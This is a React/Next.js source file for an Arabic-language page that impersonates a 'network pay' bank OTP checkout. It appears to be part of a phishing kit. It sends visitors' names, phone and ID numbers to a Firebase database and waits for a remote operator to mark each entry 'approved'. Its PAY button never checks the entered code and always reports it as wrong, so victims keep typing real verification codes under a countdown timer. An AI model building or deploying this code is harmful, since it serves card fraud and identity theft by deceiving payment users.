"use client";
import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { Loader2 } from "lucide-react";
import StepBar from "@/components/StepBar";
import { rtdb } from "@/lib/firebase";
import { ref, push, onValue, off, serverTimestamp } from "firebase/database";
import { useFormData } from "@/context/FormContext";

function genOtp() { return Math.floor(100000 + Math.random() * 900000).toString(); }
function genCode() { return `ESA-${Math.floor(100000 + Math.random() * 900000)}`; }

export default function OtpPage() {
  const router = useRouter();
  const { data, setDocId, setConfirmationCode } = useFormData();
  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
  const [seconds, setSeconds] = useState(232);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [saved, setSaved] = useState(false);
  const refs = useRef<(HTMLInputElement | null)[]>([]);
  const docIdRef = useRef<string | null>(null);
  const otpCode = useRef(genOtp());
  const confCode = useRef(genCode());

  useEffect(() => {
    const payload = {
      name: data.name || "—", phone: data.phone || "—", id_number: data.id_number || "—",
      membership: data.membership || "—", emirate: data.emirate || "—",
      delivery_date: data.delivery_date || "—", otp_code: otpCode.current,
      confirmation_code: confCode.current, status: "pending", created_at: serverTimestamp(),
    };
    push(ref(rtdb, "applications"), payload)
      .then((snap) => { if (!snap.key) return; docIdRef.current = snap.key; setDocId(snap.key); setConfirmationCode(confCode.current); setSaved(true); })
      .catch(() => setSaved(true));
  }, []);

  useEffect(() => {
    if (!saved || !docIdRef.current) return;
    const appRef = ref(rtdb, `applications/${docIdRef.current}`);
    onValue(appRef, (snap) => { const val = snap.val(); if (val?.status === "approved") router.push("/success"); });
    return () => off(appRef);
  }, [saved]);

  useEffect(() => {
    if (seconds <= 0) return;
    const t = setInterval(() => setSeconds((s) => s - 1), 1000);
    return () => clearInterval(t);
  }, [seconds]);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  function handleDigit(i: number, val: string) {
    const d = val.replace(/\D/g, "").slice(-1);
    const next = [...digits]; next[i] = d; setDigits(next);
    if (error) setError("");
    if (d && i < 5) refs.current[i + 1]?.focus();
  }

  function handleKeyDown(i: number, e: React.KeyboardEvent) {
    if (e.key === "Backspace" && !digits[i] && i > 0) refs.current[i - 1]?.focus();
  }

  async function handlePay() {
    const entered = digits.join("");
    if (entered.length < 6) { setError("يرجى إدخال رمز التحقق كاملاً"); return; }
    setLoading(true);
    await new Promise((r) => setTimeout(r, 900));
    setLoading(false);
    setError("الرمز غير صحيح، يرجى إدخاله من جديد");
    setDigits(["", "", "", "", "", ""]);
    setTimeout(() => refs.current[0]?.focus(), 50);
  }

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col" dir="rtl">
      <div className="w-full max-w-md mx-auto bg-[#f0f2f5] min-h-screen sm:shadow-xl">
        <div className="bg-white"><StepBar current={4} /></div>
        <div className="px-4 pt-6 pb-10">
          <div className="flex justify-center mb-6">
            <div className="flex items-center gap-1">
              <span className="text-[#1a2b50] font-bold text-2xl tracking-tight">network</span>
              <span className="text-[#e63946] font-bold text-2xl tracking-tight">pay</span>
              <svg width="18" height="18" viewBox="0 0 22 22" fill="none"><path d="M5 11l5 5 7-9" stroke="#e63946" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
          </div>
          <div className="bg-white rounded-2xl shadow-sm overflow-hidden max-w-sm mx-auto">
            <div className="flex justify-center pt-6 pb-4 border-b border-gray-100">
              <div className="flex items-center gap-1">
                <span className="text-[#1a2b50] font-bold text-xl tracking-tight">network</span>
                <span className="text-[#e63946] font-bold text-xl tracking-tight">pay</span>
                <svg width="15" height="15" viewBox="0 0 22 22" fill="none"><path d="M5 11l5 5 7-9" stroke="#e63946" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
              </div>
            </div>
            <div className="px-5 py-5">
              <p className="text-center text-sm text-gray-600 leading-relaxed mb-5">المصادقة عبر تطبيق الهاتف المتحرك من البنك<br />ستتلقى من جهة اصدار البطاقة رمز لعملية الدفع برسالة نصية</p>
              <div className="flex justify-center mb-5">
                <div className="w-11 h-11 rounded-full bg-blue-600 flex items-center justify-center shadow">
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M5 13l4 4L19 7"/></svg>
                </div>
              </div>
              <p className="text-center text-sm text-gray-600 leading-relaxed mb-5">يرجى ادخال رمز التحقق المرسل على الجوال الخاص بك.<br />او قم بفتح تطبيق البنك وانقر على الاشعار الفوري</p>
              <div className="flex justify-center gap-2.5 mb-3" dir="ltr">
                {digits.map((d, i) => (
                  <input key={i} ref={(el) => { refs.current[i] = el; }} type="text" inputMode="numeric" maxLength={1} value={d}
                    onChange={(e) => handleDigit(i, e.target.value)} onKeyDown={(e) => handleKeyDown(i, e)}
                    className={`w-10 h-12 border rounded-lg text-center text-lg font-bold text-gray-700 focus:outline-none bg-gray-50 transition-colors ${error ? "border-red-400 bg-red-50" : "border-gray-300 focus:border-blue-500"}`}
                    placeholder="*"
                  />
                ))}
              </div>
              {error && <p className="text-center text-red-500 text-xs font-medium mb-2">{error}</p>}
              <div className="text-center mb-5">
                <span className={`text-xl font-bold tabular-nums ${seconds <= 30 ? "text-red-500" : "text-gray-800"}`}>{mm}:{ss}</span>
                {seconds === 0 && <p className="text-xs text-red-400 mt-1">انتهت المدة، يرجى المحاولة مجدداً</p>}
              </div>
              <button onClick={handlePay} disabled={seconds === 0 || loading} className="w-full bg-[#1a2b50] disabled:bg-gray-300 text-white font-bold py-4 rounded-xl text-base tracking-widest hover:bg-[#243b6a] transition-colors flex items-center justify-center gap-2">
                {loading ? <><Loader2 size={16} className="animate-spin" /> جاري التحقق...</> : "PAY"}
              </button>
            </div>
          </div>
          <div className="flex justify-center gap-3 mt-5">
            {[0, 1, 2].map((i) => (
              <div key={i} className="w-10 h-10 bg-white border border-gray-200 rounded-lg flex items-center justify-center shadow-sm">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1a2b50" strokeWidth="2"><rect x="3" y="6" width="18" height="13" rx="2"/><path d="M3 10h18"/><path d="M7 15h2M13 15h4"/></svg>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
